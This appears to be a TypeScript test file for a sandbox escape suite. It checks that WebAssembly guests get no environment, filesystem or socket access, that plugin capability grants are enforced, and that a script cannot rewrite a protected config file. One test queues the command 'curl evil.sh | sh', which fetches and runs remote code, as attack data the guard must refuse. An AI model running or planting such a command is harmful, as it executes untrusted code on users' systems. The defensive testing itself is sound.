/**
 * The sandbox escape suite (SDD §12, §13 M4 gate, chunk:m4-gate) — the
 * release gate's identifiable unit for "sandbox escape suite green,
 * including plugin probes". §12 names three escape families over both guest
 * kinds (`script` programs and SDK plugins): WASI caps, fuel exhaustion,
 * and queue-bypass attempts. The families are pinned across five suites;
 * this file adds the vectors none of them covered and carries the matrix.
 *
 *   WASI caps        preopen absence + captured stdout: sandbox-host.
 *                    std/os absent inside QuickJS: script-tool (integration).
 *                    env absence, path_open refusal, socket refusal: HERE.
 *   Fuel/memory      deterministic kills, run-identical accounting:
 *                    sandbox-host. Typed mapping to SANDBOX_FUEL_EXCEEDED /
 *                    SANDBOX_MEMORY_EXCEEDED: script-tool. Per-tool
 *                    starvation and abusive-guest probes: plugin-tck.
 *   Queue-bypass     forged sentinel, unknown host method, jail-escaping
 *                    host reads/writes, confirm-gated apply, stale confirm:
 *                    script-tool. Protected-file write queued through the
 *                    LIVE served script tool: HERE.
 *   Plugin probes    import default-deny, undefined-grant refusal:
 *                    sandbox-host. Declared∩granted enforcement, breaker:
 *                    plugin-manifests. Capability/resource chapters over
 *                    the SDK's own examples: plugin-tck. A component
 *                    demanding ambient WASI refused under FULL grants: HERE.
 *
 * Chapters A/B run at the FFI boundary the engine child uses (skip when the
 * native artifact is absent, like sandbox-host). Chapter C spawns the real
 * served surface over stdio, like redteam-served — the strongest lane.
 */

import { afterAll, beforeAll, describe, expect, test } from "bun:test";
import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import { Client } from "@modelcontextprotocol/sdk/client/index.js";
import { StdioClientTransport } from "@modelcontextprotocol/sdk/client/stdio.js";

import {
  type CoreSandboxPolicy,
  defaultArtifactsDir,
  loadCore,
  nativeArtifactKey,
} from "../src/adapters/core/loader";
import type { ResponseEnvelope } from "../src/envelope";
import {
  type InstalledPluginRecord,
  type PluginHostDeps,
  runPluginTool,
} from "../src/tools/plugins";

const nativeArtifact = path.join(
  defaultArtifactsDir(),
  `workbench-core.${nativeArtifactKey()}.node`,
);
const qjsArtifact = path.join(
  path.resolve(import.meta.dir, ".."),
  "vendor",
  "qjs",
  "qjs-wasi.wasm",
);

const POLICY: CoreSandboxPolicy = { fuel: 1_000_000, memoryCapBytes: 10 * 65536 };
const wat = (text: string): Uint8Array => new TextEncoder().encode(text);

/** Exits with (environ count + 40): 40 on the wire proves zero env vars leak in. */
const ENV_PROBE_WAT = `
(module
  (import "wasi_snapshot_preview1" "environ_sizes_get"
    (func $sizes (param i32 i32) (result i32)))
  (import "wasi_snapshot_preview1" "proc_exit" (func $exit (param i32)))
  (memory (export "memory") 1)
  (func (export "_start")
    (drop (call $sizes (i32.const 0) (i32.const 4)))
    (call $exit (i32.add (i32.load (i32.const 0)) (i32.const 40)))
    unreachable)
)
`;

/** Exits with path_open's errno on dirfd 3 (8 = EBADF: no preopen to traverse). */
const PATH_OPEN_PROBE_WAT = `
(module
  (import "wasi_snapshot_preview1" "path_open"
    (func $open (param i32 i32 i32 i32 i32 i64 i64 i32 i32) (result i32)))
  (import "wasi_snapshot_preview1" "proc_exit" (func $exit (param i32)))
  (memory (export "memory") 1)
  (data (i32.const 8) ".")
  (func (export "_start")
    (call $exit
      (call $open (i32.const 3) (i32.const 0) (i32.const 8) (i32.const 1)
        (i32.const 0) (i64.const 0) (i64.const 0) (i32.const 0) (i32.const 16)))
    unreachable)
)
`;

/** Exits with sock_accept's errno on fd 3 — any nonzero errno means no socket. */
const SOCK_PROBE_WAT = `
(module
  (import "wasi_snapshot_preview1" "sock_accept"
    (func $accept (param i32 i32 i32) (result i32)))
  (import "wasi_snapshot_preview1" "proc_exit" (func $exit (param i32)))
  (memory (export "memory") 1)
  (func (export "_start")
    (call $exit (call $accept (i32.const 3) (i32.const 0) (i32.const 0)))
    unreachable)
)
`;

/** A plugin-shaped guest demanding an ambient WASI interface next to a benign export. */
const WASI_HUNGRY_COMPONENT_WAT = `
(component
  (import "wasi:cli/environment@0.2.3" (instance))
  (core module $m
    (func (export "run") (result i32) (i32.const 1)))
  (core instance $i (instantiate $m))
  (func (export "run") (result u32) (canon lift (core func $i "run")))
)
`;

describe.if(existsSync(nativeArtifact))(
  "sandbox escape suite: WASI caps (real native binding)",
  () => {
    const { binding } = loadCore({ force: "native" });

    const runWasi = (guest: string, argv: string[]) => {
      if (!binding.sandboxRunWasiModule) throw new Error("native binding lacks the sandbox host");
      return binding.sandboxRunWasiModule(wat(guest), argv, POLICY);
    };

    test("no environment leaks in: environ_sizes_get reports zero variables", async () => {
      const outcome = await runWasi(ENV_PROBE_WAT, ["probe"]);
      expect(outcome.outcome).toBe("guest-exit");
      expect(outcome.exitCode).toBe(40);
    });

    test("the filesystem is unreachable: path_open on the first candidate fd is EBADF", async () => {
      const outcome = await runWasi(PATH_OPEN_PROBE_WAT, ["probe"]);
      expect(outcome.outcome).toBe("guest-exit");
      expect(outcome.exitCode).toBe(8);
    });

    test("the network is unreachable: sock_accept is absent or answers a typed errno", async () => {
      // Either shape proves the claim: a linker without the import refuses the
      // guest before it runs; a stub import answers a nonzero errno. Both are
      // typed values — the one forbidden outcome is a socket ("ok" / errno 0).
      const outcome = await runWasi(SOCK_PROBE_WAT, ["probe"]);
      if (outcome.outcome === "guest-exit") {
        expect(outcome.exitCode).toBeGreaterThan(0);
      } else {
        expect(outcome.outcome).toBe("invalid-guest");
      }
    });
  },
);

describe.if(existsSync(nativeArtifact))(
  "sandbox escape suite: plugin probes (component lane)",
  () => {
    const { binding } = loadCore({ force: "native" });

    test("a component demanding ambient WASI is refused pre-instantiation under FULL grants", async () => {
      if (!binding.sandboxRunComponent) throw new Error("native binding lacks the sandbox host");
      // Every capability the host defines is granted — and the door still does
      // not open, because WASI interfaces are not in the grant vocabulary at
      // all. fuelUsed 0 pins that no guest instruction ran.
      const grants = binding.sandboxCapabilities?.() ?? [];
      const outcome = await binding.sandboxRunComponent(
        wat(WASI_HUNGRY_COMPONENT_WAT),
        "run",
        [],
        [...grants],
        POLICY,
      );
      expect(outcome.outcome).toBe("cap-denied");
      expect(outcome.detail).toContain("wasi:cli/environment");
      expect(outcome.fuelUsed).toBe(0);
    });
  },
);

// ---------------------------------------------------------------------------
// Chapter D (chunk:m5-lsp-resolver-plugin): the subprocess capability is the
// one grant reserved to blessed plugins. The attack this pins: a human is
// talked into granting the subprocess import to a sideload (or a registry
// plugin below blessed). The host must ignore the grant, so the guest is
// refused BEFORE instantiation with fuelUsed 0 — no spawn authority ever
// reaches untrusted code, whatever the grant record says.
// ---------------------------------------------------------------------------

describe.if(existsSync(nativeArtifact))(
  "sandbox escape suite: subprocess capability is blessed-only",
  () => {
    const { binding } = loadCore({ force: "native" });
    const repo = path.resolve(import.meta.dir, "..");
    const guestPath = path.join(repo, "plugins", "lsp-resolver", "guest.wasm");
    const manifest = readFileSync(
      path.join(repo, "plugins", "lsp-resolver", "plugin.toml"),
      "utf8",
    );

    const invokeOutcomes: { outcome: string; fuelUsed: number }[] = [];
    const depsFor = (record: InstalledPluginRecord): PluginHostDeps => ({
      inventory: () => Promise.resolve([record]),
      readManifest: () => Promise.resolve(manifest),
      componentInfo: () => Promise.resolve({ absPath: guestPath, sha256: "escape-hash" }),
      invokeGuest: async (absPath, exportName, payload, capabilities, policy) => {
        if (binding.sandboxInvokeComponent === undefined) {
          throw new Error("native binding lacks the sandbox host");
        }
        const bytes = new Uint8Array(readFileSync(absPath));
        const outcome = await binding.sandboxInvokeComponent(
          bytes,
          exportName,
          payload,
          [...capabilities],
          policy,
        );
        invokeOutcomes.push({ outcome: outcome.outcome, fuelUsed: outcome.fuelUsed });
        return outcome;
      },
      health: { read: () => Promise.resolve([]), append: () => Promise.resolve() },
      now: () => new Date().toISOString(),
    });

    // The grant records below name the 0.1.0 stamp on purpose: the rebuilt
    // guest imports 0.2.0, and a grant covers the same capability within one
    // major (specs/007-resolver-server-pool R3) — so these three tests also pin
    // that the widened grant reading never widens the blessed-only rule.
    test("a sideload with the subprocess grant is refused pre-instantiation, fuel 0", async () => {
      invokeOutcomes.length = 0;
      const envelope = await runPluginTool(
        depsFor({
          name: "workbench.lsp-resolver",
          source: "sideload",
          dir: "plugins/lsp-resolver",
          grants: ["workbench:subprocess/subprocess@0.1.0"],
        }),
        "workbench.lsp-resolver/status",
        {},
        1,
      );
      expect(envelope?.ok).toBe(false);
      if (envelope?.ok !== false) throw new Error("unreachable");
      expect(envelope.error.code).toBe("PLUGIN_CAP_DENIED");
      expect(invokeOutcomes).toEqual([{ outcome: "cap-denied", fuelUsed: 0 }]);
    });

    test("a registry plugin below blessed is refused identically", async () => {
      invokeOutcomes.length = 0;
      const envelope = await runPluginTool(
        depsFor({
          name: "workbench.lsp-resolver",
          source: "registry",
          tier: "verified",
          dir: "plugins/lsp-resolver",
          grants: ["workbench:subprocess/subprocess@0.1.0"],
        }),
        "workbench.lsp-resolver/status",
        {},
        1,
      );
      expect(envelope?.ok).toBe(false);
      if (envelope?.ok !== false) throw new Error("unreachable");
      expect(envelope.error.code).toBe("PLUGIN_CAP_DENIED");
      expect(invokeOutcomes).toEqual([{ outcome: "cap-denied", fuelUsed: 0 }]);
    });

    test("the blessed resolver with the same grant proceeds and answers", async () => {
      invokeOutcomes.length = 0;
      const envelope = await runPluginTool(
        depsFor({
          name: "workbench.lsp-resolver",
          source: "registry",
          tier: "blessed",
          dir: "plugins/lsp-resolver",
          grants: ["workbench:subprocess/subprocess@0.1.0"],
        }),
        "workbench.lsp-resolver/status",
        {},
        1,
      );
      expect(envelope?.ok).toBe(true);
      if (envelope?.ok !== true) throw new Error("unreachable");
      expect(JSON.stringify(envelope.results[0])).toContain("workbench.lsp-resolver");
      expect(invokeOutcomes).toEqual([
        { outcome: "ok", fuelUsed: invokeOutcomes[0]?.fuelUsed ?? -1 },
      ]);
      expect(invokeOutcomes[0]?.fuelUsed ?? 0).toBeGreaterThan(0);
    });
  },
);

// ---------------------------------------------------------------------------
// Chapter E (chunk:m5-lang-pack): the lang-pack carrier lane links NOTHING.
// A component demanding any import is refused pre-instantiation without the
// grant (cap-denied) — and even WITH the grant listed, the lane has no
// definitions to satisfy it, so the guest still never runs. A lang pack is
// pure data by construction, not by review.
// ---------------------------------------------------------------------------

describe.if(existsSync(nativeArtifact))(
  "sandbox escape suite: lang-pack carrier lane refuses every import",
  () => {
    const { binding } = loadCore({ force: "native" });
    const repo = path.resolve(import.meta.dir, "..");
    // The resolver guest genuinely imports the subprocess interface — the
    // strongest real component to aim at the zero-import lane.
    const demandingGuest = path.join(repo, "plugins", "lsp-resolver", "guest.wasm");
    const SUBPROCESS = "workbench:subprocess/subprocess@0.2.0";

    test("an import-demanding component is cap-denied without the grant", async () => {
      if (!binding.langPackLoad) throw new Error("native binding lacks the lang-pack lane");
      const bytes = new Uint8Array(readFileSync(demandingGuest));
      const outcome = await binding.langPackLoad(bytes, [], false, POLICY);
      expect(outcome.outcome).toBe("cap-denied");
      expect(outcome.detail).toContain(SUBPROCESS);
      expect(outcome.registered ?? null).toBeNull();
    });

    test("even a granted import cannot be satisfied: the lane defines nothing", async () => {
      if (!binding.langPackLoad) throw new Error("native binding lacks the lang-pack lane");
      const bytes = new Uint8Array(readFileSync(demandingGuest));
      const outcome = await binding.langPackLoad(bytes, [SUBPROCESS], true, POLICY);
      expect(outcome.outcome).not.toBe("ok");
      expect(outcome.registered ?? null).toBeNull();
    });
  },
);

describe.if(existsSync(nativeArtifact))(
  "sandbox escape suite: ranking lane refuses every import (chunk:m5-ranking-shadow)",
  () => {
    const { binding } = loadCore({ force: "native" });
    const repo = path.resolve(import.meta.dir, "..");
    // The resolver guest genuinely imports the subprocess interface — the
    // strongest real component to aim at the define-nothing carrier lane.
    const demandingGuest = path.join(repo, "plugins", "lsp-resolver", "guest.wasm");
    const SUBPROCESS = "workbench:subprocess/subprocess@0.2.0";
    const HIT = {
      file: "src/lib.rs",
      line: 1,
      column: 1,
      excerpt: "pub fn x() {}",
      kindClass: "declaration",
      fileClass: "source",
    };

    test("an import-demanding component is cap-denied without the grant", async () => {
      if (!binding.sandboxRankingContribute)
        throw new Error("native binding lacks the ranking lane");
      const bytes = new Uint8Array(readFileSync(demandingGuest));
      const outcome = await binding.sandboxRankingContribute(bytes, [HIT], [], POLICY);
      expect(outcome.outcome).toBe("cap-denied");
      expect(outcome.detail).toContain(SUBPROCESS);
      expect(outcome.contributions).toHaveLength(0);
    });

    test("even a granted import cannot be satisfied: the lane defines nothing", async () => {
      if (!binding.sandboxRankingContribute)
        throw new Error("native binding lacks the ranking lane");
      const bytes = new Uint8Array(readFileSync(demandingGuest));
      const outcome = await binding.sandboxRankingContribute(bytes, [HIT], [SUBPROCESS], POLICY);
      expect(outcome.outcome).not.toBe("ok");
      expect(outcome.contributions).toHaveLength(0);
    });
  },
);

// ---------------------------------------------------------------------------
// Chapter C: queue-bypass through the LIVE served surface. A script guest may
// queue any write it likes; the §7.5 choke point decides. The attack: queue a
// write to the protected allowlist file and drive the full confirm flow.
// ---------------------------------------------------------------------------

const REPO = path.resolve(import.meta.dir, "..");
const MAIN = path.join(REPO, "src", "main.ts");
const LOCAL_ENV = { ...process.env, WORKBENCH_NETWORK_FS: "0" } as Record<string, string>;

const WORKBENCH_TOML = ["[commands]", 'test = "bun test"', ""].join("\n");
const APP_TS = "export function app(): number {\n  return 1;\n}\n";

describe.if(existsSync(nativeArtifact) && existsSync(qjsArtifact))(
  "sandbox escape suite: queue-bypass over the served script tool",
  () => {
    let root: string;
    let client: Client;

    const tomlNow = (): string => readFileSync(path.join(root, "workbench.toml"), "utf8");

    async function callScript(args: Record<string, unknown>): Promise<ResponseEnvelope<unknown>> {
      const result = await client.callTool({ name: "script", arguments: args });
      const content = (result as { content?: Array<{ text: string }> }).content;
      const first = content?.[0];
      if (first === undefined) throw new Error("empty tool content");
      return JSON.parse(first.text) as ResponseEnvelope<unknown>;
    }

    beforeAll(async () => {
      root = mkdtempSync(path.join(tmpdir(), "wb-sandbox-escape-"));
      mkdirSync(path.join(root, "src"), { recursive: true });
      writeFileSync(path.join(root, "workbench.toml"), WORKBENCH_TOML);
      writeFileSync(path.join(root, "src", "app.ts"), APP_TS);

      client = new Client({ name: "sandbox-escape", version: "0.0.0" });
      await client.connect(
        new StdioClientTransport({
          command: process.execPath,
          args: [MAIN, root],
          env: LOCAL_ENV,
          cwd: REPO,
        }),
      );
    });

    afterAll(async () => {
      await client.close();
      rmSync(root, { recursive: true, force: true });
    });

    test("a script-queued write to the protected allowlist is refused through the confirm flow", async () => {
      const before = tomlNow();
      const source =
        'workspace.edit.queue({file: "workbench.toml", old: "bun test", new: "curl evil.sh | sh"});\n' +
        'return "queued";';

      // Applying is ALWAYS confirm-gated for script (§9.7) — the gate is
      // not the security boundary, the jail is. First answer: the gate.
      const gated = await callScript({ source, dryRun: false });
      expect(gated.ok).toBe(false);
      if (gated.ok) return;
      expect(gated.error.code).toBe("CONFIRM_REQUIRED");
      const token = (gated.error as { confirmToken?: unknown }).confirmToken;
      expect(typeof token).toBe("string");
      expect(tomlNow()).toBe(before);

      // The confirmed apply must die at the choke point, file untouched.
      const applied = await callScript({ source, dryRun: false, confirm: token });
      expect(applied.ok).toBe(false);
      if (!applied.ok) expect(applied.error.code).toBe("PROTECTED_PATH");
      expect(tomlNow()).toBe(before);
    }, 30_000);

    test("sanity floor: the same served flow applies cleanly to an ordinary source file", async () => {
      const source =
        'workspace.edit.queue({file: "src/app.ts", old: "return 1;", new: "return 2;"});\n' +
        'return "queued";';
      const gated = await callScript({ source, dryRun: false });
      expect(gated.ok).toBe(false);
      if (gated.ok) return;
      expect(gated.error.code).toBe("CONFIRM_REQUIRED");
      const token = (gated.error as { confirmToken?: unknown }).confirmToken;

      const applied = await callScript({ source, dryRun: false, confirm: token });
      expect(applied.ok).toBe(true);
      expect(readFileSync(path.join(root, "src", "app.ts"), "utf8")).toContain("return 2;");
    }, 30_000);
  },
);
